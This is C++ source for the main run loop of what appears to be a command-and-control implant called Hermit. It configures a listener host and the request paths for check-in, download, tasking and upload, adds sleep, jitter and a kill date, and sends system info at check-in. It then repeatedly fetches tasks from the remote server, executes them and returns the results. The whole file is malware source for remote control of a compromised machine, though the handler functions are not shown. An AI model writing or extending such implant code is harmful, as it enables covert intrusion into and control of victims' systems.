#include "hermit.hpp"

namespace Hermit
{
	BOOL Run(
		HINSTANCE       hInstance,
		INT 			nCmdShow,
		LPCWSTR			lpPayloadType,
		LPCWSTR			lpProtocol,
		LPCWSTR 		lpHost,
		INTERNET_PORT 	nPort,
		LPCWSTR 		lpReqPathCheckIn,
		LPCWSTR			lpReqPathDownload,
		LPCWSTR 		lpReqPathTaskGet,
		LPCWSTR 		lpReqPathTaskResult,
		LPCWSTR			lpReqPathUpload,
		LPCWSTR			lpReqPathWebSocket,
		INT 			nSleep,
		INT				nJitter,
		INT				nKillDate
	) {
		State::StateManager sm;
		sm.SetHInstance(hInstance);
		sm.SetCmdShow(nCmdShow);
		sm.SetPayloadType(lpPayloadType);
		sm.SetListenerProtocol(lpProtocol);
		sm.SetListenerHost(lpHost);
		sm.SetListenerPort(nPort);
		sm.SetReqPathCheckIn(lpReqPathCheckIn);
		sm.SetReqPathDownload(lpReqPathDownload);
		sm.SetReqPathTaskGet(lpReqPathTaskGet);
		sm.SetReqPathTaskResult(lpReqPathTaskResult);
		sm.SetReqPathUpload(lpReqPathUpload);
		sm.SetReqPathWebSocket(lpReqPathWebSocket);
		sm.SetSleep(nSleep);
		sm.SetJitter(nJitter);
		sm.SetKillDate(nKillDate);
		sm.SetHSession(NULL);
		sm.SetHConnect(NULL);
		sm.SetHRequest(NULL);
		sm.SetQuit(FALSE);

		// Get initial system info for sending it when check-in
		std::wstring infoJson = Handler::GetInitialInfo(sm);

		Handler::InitHTTP(sm);
		if (sm.GetHSession() == NULL || sm.GetHConnect() == NULL)
		{
			Handler::CloseHTTP(sm);
			return FALSE;
		}

		// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);

		// Check in
		do
		{
			Sleep(sm.GetSleep() * 1000);

			if (Handler::CheckIn(sm, infoJson))
				break;
		} while (1 == 1);

		// Get/Execute/Send tasks
		do
		{
			Sleep(sm.GetSleep() * 1000);

			if (!Handler::GetTask(sm))
				continue;

			Handler::ExecuteTask(sm);
			Handler::SendTaskResult(sm);
		} while (!sm.GetQuit());

		Handler::CloseHTTP(sm);
		
		return TRUE;
	}
}

